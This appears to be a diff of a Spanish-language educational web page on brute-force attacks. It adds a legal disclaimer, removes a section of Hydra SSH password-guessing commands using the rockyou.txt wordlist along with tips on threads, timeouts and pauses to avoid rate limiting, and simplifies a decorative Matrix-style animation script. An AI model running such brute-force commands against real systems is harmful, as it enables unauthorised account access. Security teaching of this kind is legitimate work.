+                    <p><strong>Advertencia Legal:</strong> Este contenido es exclusivamente educativo. Los ataques de fuerza bruta son ilegales cuando se realizan sin autorización explícita. Úsalos solo en sistemas propios, laboratorios controlados o durante auditorías de seguridad autorizadas por contrato escrito.</p>
                 </div>
-            </section>
-
-            <section class="section">
-                <h2><i class="fas fa-lightbulb"></i>Optimización de Ataques</h2>
-                
-                <h3>Parámetros Avanzados de Hydra</h3>
-                <div class="code-block">
-                    <div class="code-label">Opciones de Rendimiento</div>
-                    <code># Ajustar número de hilos paralelos
-hydra -t 16 -l admin -P rockyou.txt ssh://target
-
-# Establecer timeout personalizado  
-hydra -w 30 -l admin -P rockyou.txt ssh://target
-
-# Modo verbose para debugging
-hydra -v -l admin -P rockyou.txt ssh://target</code>
-                </div>
-
-                <h3>Consideraciones de Rendimiento</h3>
-                <ul>
-                    <li><strong>Hilos (-t):</strong> Balance entre velocidad y detección</li>
-                    <li><strong>Timeout (-w):</strong> Ajustar según latencia de red</li>
-                    <li><strong>Pausas:</strong> Evitar bloqueos por rate limiting</li>
-                    <li><strong>Recursos del sistema:</strong> Monitorear CPU y memoria</li>
-                </ul>
             </section>
         </main>
 
@@ -613,118 +392,24 @@ hydra -v -l admin -P rockyou.txt ssh://target</code>
             <p>Contenido educativo para profesionales de la seguridad informática</p>
         </footer>
     </div>
-    
-    <!-- Matrix Rain Animation Script -->
+
     <script>
-    // Matrix Rain Effect
-    class MatrixRain {
-        constructor() {
-            this.canvas = document.getElementById('matrix-canvas');
-            this.ctx = this.canvas.getContext('2d');
-            
-            this.canvas.width = window.innerWidth;
-            this.canvas.height = window.innerHeight;
-            
-            this.katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン';
-            this.latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
-            this.nums = '0123456789';
-            this.alphabet = this.katakana + this.latin + this.nums;
-            
-            this.fontSize = 16;
-            this.columns = this.canvas.width / this.fontSize;
-            
-            this.rainDrops = [];
-            
-            for(let x = 0; x < this.columns; x++) {
-                this.rainDrops[x] = 1;
-            }
-            
-            this.draw();
-            
-            window.addEventListener('resize', () => this.handleResize());
-        }
-        
-        draw() {
-            this.ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-            this.ctx.fillRect(0, 0, this.canvas.width, this.canvas.height);
-            
-            this.ctx.fillStyle = '#00FF00';
-            this.ctx.font = this.fontSize + 'px monospace';
-            
-            for(let i = 0; i < this.rainDrops.length; i++) {
-                const text = this.alphabet.charAt(Math.floor(Math.random() * this.alphabet.length));
-                
-                this.ctx.shadowColor = '#00FF00';
-                this.ctx.shadowBlur = 10;
-                
-                this.ctx.fillText(text, i * this.fontSize, this.rainDrops[i] * this.fontSize);
-                
-                this.ctx.shadowBlur = 0;
-                
-                if(this.rainDrops[i] * this.fontSize > this.canvas.height && Math.random() > 0.975) {
-                    this.rainDrops[i] = 0;
-                }
-                this.rainDrops[i]++;
-            }
-            
-            requestAnimationFrame(() => this.draw());
-        }
-        
-        handleResize() {
-            this.canvas.width = window.innerWidth;
-            this.canvas.height = window.innerHeight;
-            this.columns = this.canvas.width / this.fontSize;
-            
-            this.rainDrops = [];
-            for(let x = 0; x < this.columns; x++) {
-                this.rainDrops[x] = 1;
+        function createMatrixRain() {
+            const container = document.getElementById('matrix-rain');
+            const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
+            for (let i = 0; i < 50; i++) {
+                const column = document.createElement('div');
+                column.className = 'matrix-column';
+                column.style.left = Math.random() * 100 + '%';
+                column.style.animationDuration = (Math.random() * 3 + 2) + 's';
+                column.style.animationDelay = Math.random() * 2 + 's';
+                let text = '';
+                for (let j = 0; j < 20; j++) text += chars[Math.floor(Math.random() * chars.length)] + '<br>';
+                column.innerHTML = text;
+                container.appendChild(column);
             }
         }
-    }
-    
-    // Initialize Matrix Rain when DOM is loaded
-    document.addEventListener('DOMContentLoaded', () => {
-        new MatrixRain();
-    });
-    
-    // Add matrix-style typing effect to headers
-    document.addEventListener('DOMContentLoaded', () => {
-        const headers = document.querySelectorAll('h1, h2, h3, h4, h5, h6');
-        
-        headers.forEach((header, index) => {
-            setTimeout(() => {
-                header.style.opacity = '0';
-                header.style.transform = 'translateY(20px)';
-                header.style.transition = 'all 0.6s ease';
-                
-                setTimeout(() => {
-                    header.style.opacity = '1';
-                    header.style.transform = 'translateY(0)';
-                }, 100);
-            }, index * 200);
-        });
-    });
-    
-    // Add matrix-style fade-in effect for content
-    document.addEventListener('DOMContentLoaded', () => {
-        const elements = document.querySelectorAll('p, .example, .code-block, .tool-card');
-        
-        const observer = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    entry.target.style.opacity = '1';
-                    entry.target.style.transform = 'translateY(0)';
-                }
-            });
-        });
-        
-        elements.forEach(el => {
-            el.style.opacity = '0';
-            el.style.transform = 'translateY(30px)';
-            el.style.transition = 'all 0.8s ease';
-            observer.observe(el);
-        });
-    });
+        document.addEventListener('DOMContentLoaded', createMatrixRain);
     </script>
 </body>
 </html>
